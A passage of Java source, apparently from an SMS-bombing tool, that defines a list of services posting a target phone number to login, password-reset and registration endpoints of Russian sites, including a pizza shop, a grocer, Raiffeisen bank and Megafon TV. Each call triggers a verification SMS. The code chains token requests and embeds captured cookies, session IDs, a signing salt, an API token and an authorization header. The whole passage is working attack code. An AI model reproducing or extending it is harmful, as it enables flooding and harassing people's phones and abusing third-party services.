BITRIX_SM_RS_MY_LOCATION=a%3A11%3A%7Bs%3A2%3A%22ID%22%3Bs%3A2%3A%2220%22%3Bs%3A4%3A%22NAME%22%3Bs%3A24%3A%22%D0%AD%D0%BB%D0%B5%D0%BA%D1%82%D1%80%D0%BE%D1%81%D1%82%D0%B0%D0%BB%D1%8C%22%3Bs%3A4%3A%22CODE%22%3Bs%3A10%3A%220000031716%22%3Bs%3A8%3A%22LATITUDE%22%3Bs%3A8%3A%220.000000%22%3Bs%3A9%3A%22LONGITUDE%22%3Bs%3A8%3A%220.000000%22%3Bs%3A11%3A%22REGION_NAME%22%3Bs%3A35%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%3Bs%3A11%3A%22REGION_CODE%22%3Bs%3A10%3A%220000028025%22%3Bs%3A21%3A%22COUNTRY_DISTRICT_NAME%22%3Bs%3A10%3A%22%D0%A6%D0%B5%D0%BD%D1%82%D1%80%22%3Bs%3A21%3A%22COUNTRY_DISTRICT_CODE%22%3Bs%3A10%3A%220000028024%22%3Bs%3A12%3A%22COUNTRY_NAME%22%3Bs%3A12%3A%22%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D1%8F%22%3Bs%3A12%3A%22COUNTRY_CODE%22%3Bs%3A10%3A%220000028023%22%3B%7D; _ga_7B33G1M8EY=GS1.1.1682936033.1.1.1682936037.0.0.0; _ga=GA1.1.1774221769.1682936034; BITRIX_SM_LAST_VISIT=01.05.2023%2013%3A14%3A05' \\\n" +
                        "  -H 'referer: https://www.kspecmash.ru/?_r=7254' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://vladimir.holodilnik.ru/ajax/user/get_tpl.php?84.2968488677933' \\\n" +
                        "  -H 'authority: vladimir.holodilnik.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: OrderUserType=1; region_position_nn=24; clean=1; new_reg=2; fcg_favourite_new=2; fcg_change_list_view=2; HRUSIDSHORT=79e451eabaa7e7bcbb9d261769897ef3; HRUSID=9cf0c1df15c910217e7e1e885ae60921; HRUSIDLONG=03db12514ed1285de946a5045cdaa9be; csrfnews=2e620195b99934f61c273d0f5101c24a; _utmx=9cf0c1df15c910217e7e1e885ae60921; action_blocks=; banners_rotations=1181; _ym_uid=1673961868198063374; _ym_d=1682939583; _ga=GA1.2.1886752553.1682939583; _gid=GA1.2.138777877.1682939583; _gat=1; _utmz=2cebd56ce5cbf15d6e6fdaa7d46aa40551ade24425f8530e480df12b1823376e; _ym_isad=2; _ym_visorc=b; _userGUID=0:lh4qrxub:HaBOrCVTH89YheIrbccmv4aFWJ7kifO3; dSesn=990cb0bc-d739-8059-d8f2-4d073b3b1358; _dvs=0:lh4qrxub:yonBY8hNIvx96VZ3g2KsueapG7hvr6bB; PHPSESSID=26e66e6cf387eeca097721c152f466d7; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ga_EHP29G0JCQ=GS1.1.1682939582.1.0.1682939584.0.0.0; tmr_lvid=668db02d45d79ad233216bc3a7aef88b; tmr_lvidTS=1673961864893; advcake_track_id=8eb27bb2-d5ab-4f4e-7495-c0b4ec2af547; advcake_session_id=55329c31-2845-bbae-56f1-b00014f162bf; flocktory-uuid=e429bd85-39fc-4d6b-9b57-d6abe16258af-3; _gp1000247C={\"hits\":1,\"vc\":1}; _gpVisits={\"isFirstVisitDomain\":true,\"idContainer\":\"1000247C\"}; adrdel=1; adrcid=AmTu7d3PvGhZIQULiIyZaCQ; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; tmr_detect=0%7C1682939587528' \\\n" +
                        "  -H 'origin: https://vladimir.holodilnik.ru' \\\n" +
                        "  -H 'referer: https://vladimir.holodilnik.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'ajkey=6f348e0152ed75c0255c2ae8cbf3aea8&ajform=LOGIN_FORM&ajaction=GET_CODE&ajphoneORemail=%2B{formatted_phone:*+(***)+***-**-**}&ajverifycode=&ajUserType=1&ajConfPhone=&ajConfEmail=&ajPswd=&ajSubMode=' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://dobropizza.ru/ajaxopen/user_ask_password' \\\n" +
                        "  -H 'authority: dobropizza.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded' \\\n" +
                        "  -H 'cookie: __ddg1_=KvHU7nV7hPLtYMAtACK2; session=oeo88lep1buhribfl0r63b7ts1; order_items=[]; order_sets=[]; _gid=GA1.2.1536561624.1682939991; _gat=1; _ym_uid=1648578784303133306; _ym_d=1682939992; _ym_isad=2; _ga_3DW5K9H240=GS1.1.1682939991.1.0.1682939991.0.0.0; _ga=GA1.1.623834408.1682939991; _ym_visorc=w' \\\n" +
                        "  -H 'origin: https://dobropizza.ru' \\\n" +
                        "  -H 'referer: https://dobropizza.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  --data-raw 'username={formatted_phone:%2B*(***)%20***-**-**}&cis=882' \\\n" +
                        "  --compressed", 7),


                new JsonService("https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization", 7) {

                    public String generateMd5(String input) throws NoSuchAlgorithmException {
                        MessageDigest md = MessageDigest.getInstance("MD5");
                        byte[] mdBytes = md.digest(input.getBytes(StandardCharsets.UTF_8));
                        BigInteger bigInt = new BigInteger(1, mdBytes);
                        String md5Hex = bigInt.toString(16);
                        while (md5Hex.length() < 32) {
                            md5Hex = "0" + md5Hex;
                        }
                        return md5Hex;
                    }

                    @Override
                    public String buildJson(Phone phone) {
                        request.header("Cookie", "JSESSIONID=7D4E3639AA59094CE97756A898BADBCA; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=ru; _ga=GA1.2.1521279070.1644593314; _gid=GA1.2.430099716.1682940568; _fbp=fb.1.1682940567889.253285313; _ym_uid=1644593314239563437; _ym_d=1682940568; _ym_isad=2; _ym_visorc=w; scroll=1");

                        JSONObject json = new JSONObject();

                        try {
                            json.put("phone", Phone.format(phone.getPhone(), "+7 *** ***-**-**"));
                            json.put("signature", generateMd5("713062a852687fce429456474924fb1b" + phone));
                        } catch (JSONException | NoSuchAlgorithmException e) {
                            e.printStackTrace();
                        }

                        return json.toString();
                    }
                },

                new CurlService("curl 'https://sushi-star.ru/user/ajax444.php?do=sms_code' \\\n" +
                        "  -H 'authority: sushi-star.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: _ym_uid=1677588101101445814; _ym_d=1677588101; PHPSESSID=93ccf907effdb221e0f6921519644052; choosing_branch=yes; _ym_isad=2' \\\n" +
                        "  -H 'origin: https://sushi-star.ru' \\\n" +
                        "  -H 'referer: https://sushi-star.ru/user/login.php' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'phone={phone:8(***)***-**-**}' \\\n" +
                        "  --compressed", 7),

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        new CurlService("curl 'https://online.raiffeisen.ru/id/oauth/id/token' \\\n" +
                                "  -H 'Accept: application/json, text/plain, */*' \\\n" +
                                "  -H 'Accept-Language: ru' \\\n" +
                                "  -H 'Authorization: Basic cHJvZC1jbGllbnQtaWQ6eHh+Yjd9ZU8yUSR7eVkqe3ROTDRTZTBhaiR5KkA0Uks=' \\\n" +
                                "  -H 'Connection: keep-alive' \\\n" +
                                "  -H 'Content-Type: application/json;charset=UTF-8' \\\n" +
                                "  -H 'Cookie: geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; APPLICATION_CONTEXT_CITY=21; mobile=false; device=pc; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-05-01%2015%3A49%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-05-01%2015%3A49%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36; _ga=GA1.2.1258444119.1682945354; _gid=GA1.2.1528676486.1682945354; _gat=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F; _ym_uid=168294535524853204; _ym_d=1682945355; _ym_isad=2; _ym_visorc=b; _ga=GA1.1.1258444119.1682945354; _gid=GA1.1.1528676486.1682945354; rc-locale=ru; __zzat129=MDA0dBA=Fz2+aQ==; cfids129=tfPb9m2FDzAtzDxDGNCHtg2gRw3I+W5zB9sSeLkgrIXPha3CQIINjur9H+yGCzyyTW1A0ysA1ykuGlRBnax2t/eIbnuv5e5z6mKy35bWrhkEFQqptwVybhJGvCQLcW+8NvB5XDqJF7qDlYozzEOl3gCZBTjppOEF0RWa' \\\n" +
                                "  -H 'Origin: https://online.raiffeisen.ru' \\\n" +
                                "  -H 'RC-Device: web' \\\n" +
                                "  -H 'Referer: https://online.raiffeisen.ru/login/main' \\\n" +
                                "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                                "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                                "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
                                "  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                                "  -H 'X-Device-Id: c1ffdfd4-39e0-4ca8-8cda-c9e9724c2a01' \\\n" +
                                "  -H 'X-Request-Id: 8da94bed-caab-4aec-b278-4e6a190dc59d' \\\n" +
                                "  -H 'X-Session-Id: 3e513fa3-b01b-4b5c-a23c-18bcef0fe53e' \\\n" +
                                "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                                "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                                "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                                "  --data-raw '{\"grant_type\":\"phone\",\"phone\":\"{full_phone}\"}' \\\n" +
                                "  --compressed").run(client, (call, response) -> {
                            try {
                                ResponseBody body = response.body();
                                if (body == null) {
                                    callback.onResponse(call, response);
                                    return;
                                }
                                JSONObject json = new JSONObject(body.string());
                                new CurlService("curl 'https://online.raiffeisen.ru/id/oauth/mfa/otp/send' \\\n" +
                                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
                                        "  -H 'Accept-Language: ru' \\\n" +
                                        "  -H 'Authorization: Basic cHJvZC1jbGllbnQtaWQ6eHh+Yjd9ZU8yUSR7eVkqe3ROTDRTZTBhaiR5KkA0Uks=' \\\n" +
                                        "  -H 'Connection: keep-alive' \\\n" +
                                        "  -H 'Content-Type: application/json;charset=UTF-8' \\\n" +
                                        "  -H 'Cookie: geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; APPLICATION_CONTEXT_CITY=21; mobile=false; device=pc; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-05-01%2015%3A49%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-05-01%2015%3A49%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36; _ga=GA1.2.1258444119.1682945354; _gid=GA1.2.1528676486.1682945354; _gat=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F; _ym_uid=168294535524853204; _ym_d=1682945355; _ym_isad=2; _ym_visorc=b; _ga=GA1.1.1258444119.1682945354; _gid=GA1.1.1528676486.1682945354; rc-locale=ru; __zzat129=MDA0dBA=Fz2+aQ==; cfids129=tfPb9m2FDzAtzDxDGNCHtg2gRw3I+W5zB9sSeLkgrIXPha3CQIINjur9H+yGCzyyTW1A0ysA1ykuGlRBnax2t/eIbnuv5e5z6mKy35bWrhkEFQqptwVybhJGvCQLcW+8NvB5XDqJF7qDlYozzEOl3gCZBTjppOEF0RWa' \\\n" +
                                        "  -H 'Origin: https://online.raiffeisen.ru' \\\n" +
                                        "  -H 'RC-Device: web' \\\n" +
                                        "  -H 'Referer: https://online.raiffeisen.ru/login/main' \\\n" +
                                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
                                        "  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                                        "  -H 'X-Device-Id: c1ffdfd4-39e0-4ca8-8cda-c9e9724c2a01' \\\n" +
                                        "  -H 'X-Request-Id: c1b5cd8b-f217-4268-87fa-be44cd267236' \\\n" +
                                        "  -H 'X-Session-Id: 3e513fa3-b01b-4b5c-a23c-18bcef0fe53e' \\\n" +
                                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                                        "  --data-raw '{\"mfa_token\":\"" + json.getString("access_token") + "\"}' \\\n" +
                                        "  --compressed").run(client, callback, phone);
                            } catch (JSONException | NullPointerException e) {
                                callback.onError(call, e);
                            }
                        }, phone);
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        new CurlService("curl 'https://vla.vkusvill.ru/ajax/gen_ckey.php' \\\n" +
                                "  -X 'POST' \\\n" +
                                "  -H 'authority: vla.vkusvill.ru' \\\n" +
                                "  -H 'accept: */*' \\\n" +
                                "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                                "  -H 'content-length: 0' \\\n" +
                                "  -H 'cookie: PHPSESSID=QHWuUtUODHtyQDeWzRUWf72eMEgWQkTv; UF_USER_BUY_SITE=N; UF_USER_AUTH=N; ABvariantBX_test_kg_in_pce=A; ABvariantBX_test_product_card_descr=B; ABvariantBX_test_torty_section_image=A; ABvariantBX_giftcard_banner_in_b2b_profile=B; ABvariantBX_UXFB_SEGMENT=C; ABvariantBX_test_search_logos_input=A; ABvariantBX_test_personal_specials_mobile=B; ABvariantBX_test_telegram_sign=A; _ymab_param=F1D5IBiyzdxPLKtxkO1jPaI5vl4UDAKyzgHgFwj4ewq235OO71w7aY0n9AB5rIlGi3TO6BUVFk8e5n2Q0EC0l6Cy29U; BITRIX_SM_SALE_UID=285034039; BITRIX_SM_REGION_ID_3=3875; BITRIX_SM_REGION_DOMAIN_3=vla; SERVERID=bitrix02; HEADER_TOP_BN_SECT_ID=1590; HEADER_TOP_BN_ID=1723195; tmr_lvid=ad3c43cbd2fe11e07704d9504c640bac; tmr_lvidTS=1682945201047; _gcl_au=1.1.1566507895.1682945201; _ym_uid=1682945201422798542; _ym_d=1682945201; _vv_card=%3C470219; _ga=GA1.2.1031440314.1682945201; _gid=GA1.2.229059216.1682945202; _gat_gtag_UA_138047372_1=1; _ym_isad=2; _dc_gtm_UA-138047372-1=1; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; russian_crt_available=N; tmr_detect=0%7C1682945203908; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fvla.vkusvill.ru%252F; mgo_uid=PhC9ivV1XX7BPooL4OKC; mgo_cnt=1; mgo_sid=9juurtzctz11001n3wde; uxs_uid=3cb41090-e81e-11ed-b69a-0b43f7c44d6f; WE_USE_COOKIE=Y; _ga_YJMLVXQQNQ=GS1.1.1682945201.1.1.1682945221.40.0.0' \\\n" +
                                "  -H 'origin: https://vla.vkusvill.ru' \\\n" +
                                "  -H 'referer: https://vla.vkusvill.ru/' \\\n" +
                                "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                                "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                                "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                                "  -H 'sec-fetch-dest: empty' \\\n" +
                                "  -H 'sec-fetch-mode: cors' \\\n" +
                                "  -H 'sec-fetch-site: same-origin' \\\n" +
                                "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                                "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                                "  --compressed").run(client, (call, response) -> {
                            ResponseBody body = response.body();
                            if (body == null) {
                                callback.onResponse(call, response);
                                return;
                            }
                            new CurlService("curl 'https://vla.vkusvill.ru/ajax/user_v2/auth/check_phone.php' \\\n" +
                                    "  -H 'authority: vla.vkusvill.ru' \\\n" +
                                    "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                                    "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                                    "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                                    "  -H 'cookie: PHPSESSID=QHWuUtUODHtyQDeWzRUWf72eMEgWQkTv; UF_USER_BUY_SITE=N; UF_USER_AUTH=N; ABvariantBX_test_kg_in_pce=A; ABvariantBX_test_product_card_descr=B; ABvariantBX_test_torty_section_image=A; ABvariantBX_giftcard_banner_in_b2b_profile=B; ABvariantBX_UXFB_SEGMENT=C; ABvariantBX_test_search_logos_input=A; ABvariantBX_test_personal_specials_mobile=B; ABvariantBX_test_telegram_sign=A; _ymab_param=F1D5IBiyzdxPLKtxkO1jPaI5vl4UDAKyzgHgFwj4ewq235OO71w7aY0n9AB5rIlGi3TO6BUVFk8e5n2Q0EC0l6Cy29U; BITRIX_SM_SALE_UID=285034039; BITRIX_SM_REGION_ID_3=3875; BITRIX_SM_REGION_DOMAIN_3=vla; SERVERID=bitrix02; HEADER_TOP_BN_SECT_ID=1590; HEADER_TOP_BN_ID=1723195; tmr_lvid=ad3c43cbd2fe11e07704d9504c640bac; tmr_lvidTS=1682945201047; _gcl_au=1.1.1566507895.1682945201; _ym_uid=1682945201422798542; _ym_d=1682945201; _vv_card=%3C470219; _ga=GA1.2.1031440314.1682945201; _gid=GA1.2.229059216.1682945202; _gat_gtag_UA_138047372_1=1; _ym_isad=2; _dc_gtm_UA-138047372-1=1; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; russian_crt_available=N; tmr_detect=0%7C1682945203908; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fvla.vkusvill.ru%252F; mgo_uid=PhC9ivV1XX7BPooL4OKC; mgo_cnt=1; mgo_sid=9juurtzctz11001n3wde; uxs_uid=3cb41090-e81e-11ed-b69a-0b43f7c44d6f; WE_USE_COOKIE=Y; _ga_YJMLVXQQNQ=GS1.1.1682945201.1.1.1682945221.40.0.0' \\\n" +
                                    "  -H 'origin: https://vla.vkusvill.ru' \\\n" +
                                    "  -H 'referer: https://vla.vkusvill.ru/' \\\n" +
                                    "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                                    "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                                    "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                                    "  -H 'sec-fetch-dest: empty' \\\n" +
                                    "  -H 'sec-fetch-mode: cors' \\\n" +
                                    "  -H 'sec-fetch-site: same-origin' \\\n" +
                                    "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                                    "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                                    "  --data-raw 'cname=&FUSER_ID=285034039&USER_NAME=&USER_PHONE=%2B{formatted_phone:*+(***)+***-**-**}&token=&is_retry=&AGREE_SUBSCRIBE=Y&ckey=" + body.string() + "' \\\n" +
                                    "  --compressed").run(client, callback, phone);

                        }, phone);
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://kronshtadt.food-port.ru/api/user/generate-password")
                                .header("x-thapl-apitoken", "0b84683a-14b6-11ed-9881-d00d1849d38c")
                                .header("x-thapl-domain", "kronshtadt.food-port.ru")
                                .header("x-thapl-region-id", "2")
                                .post(RequestBody.create("------WebKitFormBoundaryd1lHEip8CBDSaYZd\n" +
                                        "Content-Disposition: form-data; name=\"phone\"\n" +
                                        "\n" +
                                        Phone.format(phone.getPhone(), "+7 *** *** ** **") +
                                        "\n------WebKitFormBoundaryd1lHEip8CBDSaYZd--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryd1lHEip8CBDSaYZd")))
                                .build()).enqueue(callback);
                    }
                },

                new Service(7) {
                    @Override
                    public void run(OkHttpClient client, Callback callback, Phone phone) {
                        client.newCall(new Request.Builder()
                                .url("https://megafon.tv/")
                                .get().build()).enqueue((Callback) (call, response) -> {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("msisdn", "+" + phone);
                                json.put("password", "91234657111");
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            StringBuilder cookie = new StringBuilder();

                            for (String entry : response.headers("Set-Cookie")) {
                                cookie.append(entry.split(";")[0]);
                                cookie.append("; ");
                            }

                            try {
                                client.newCall(new Request.Builder()
                                        .url("https://bmp.megafon.tv/api/v10/auth/register/msisdn")
                                        .addHeader("Cookie", cookie.toString())
                                        .post(RequestBody.create(
                                                json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);
                            } catch (NullPointerException e) {
                                callback.onError(call, e);
                            }
                        });
                    }
                },

                new CurlService("curl 'https://www.techport.ru/registration?type=false' \\\n" +
                        "  -H 'authority: www.techport.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: sessuid=bb9735f3abe9b348a66356ce45b8d13a; city_id_po=1; city_id_po_kladr=7700000000000; nusc=MSK; bknd=b1e; flocktory-uuid=348d06b3-5bad-4513-ba6e-9c776c0abd7c-1; _gcl_au=1.1.1766922942.1682951354; ucuid=959930506.644707205.-241305704.2049059978; ucnuid=5632; ucsuid=1642688454.2037854877.1275961237.1402125306; _ga=GA1.2.1658537611.1682951354; _gid=GA1.2.615528915.1682951354; _dc_gtm_UA-26133301-1=1; tmr_lvid=f1326cb6176f91aa7768ae708623ed0c; tmr_lvidTS=1673961980785; _ym_uid=167396198198105830; _ym_d=1682951354; _ym_visorc=w; _ym_isad=2; tmr_detect=0%7C1682951356466' \\\n" +
                        "  -H 'origin: https://www.techport.ru' \\\n" +
                        "  -H 'referer: https://www.techport.ru/' \\\n" +
